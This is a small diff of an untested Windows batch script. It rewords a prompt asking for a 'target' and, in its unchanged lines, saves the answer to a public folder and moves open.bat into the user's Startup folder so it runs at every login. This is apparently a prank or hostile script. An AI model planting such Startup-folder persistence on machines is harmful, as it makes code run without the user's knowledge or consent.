@@ -7,7 +7,7 @@
 :: This script has not been tested
 color 2
 
-set /p Target=Who is the target?
+set /p Target=Who you is?
 echo %Target%>C:\Users\Public\target.txt
 
 move open.bat "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\open.bat"
